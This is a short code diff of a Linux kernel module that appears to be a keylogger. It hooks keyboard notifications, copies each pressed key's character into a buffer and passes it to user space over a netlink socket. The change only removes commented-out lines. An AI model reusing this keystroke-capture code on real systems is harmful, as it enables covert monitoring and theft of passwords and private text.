@@ -104,10 +104,8 @@ static int kb_notify(
 
             /* Retrieve the correct caps or non-caps character string */
             if (shiftKeyDepressed == 0)
-                // strncpy(keypress_buff, keymap[key.keycode], strlen(keymap[key.keycode]));
                 strncpy(keypress_buff, keymap[key.keycode], KEYPRESS_BUFFSIZE);
             else
-                // strncpy(keypress_buff, keymapShiftActivated[key.keycode], strlen(keymapShiftActivated[key.keycode]));
                 strncpy(keypress_buff, keymapShiftActivated[key.keycode], KEYPRESS_BUFFSIZE);
 
             if(!init_stamp)
@@ -174,8 +172,6 @@ static void nl_send_msg(void)
 
 static int __init kb_init(void)
 {
-    // memset(&keypress_buff, '\0', sizeof keypress_buff);
-
     /* Create the netlink socket */
     nl_sk = netlink_kernel_create(&init_net, MYPROTO, NULL);
     if (!nl_sk)
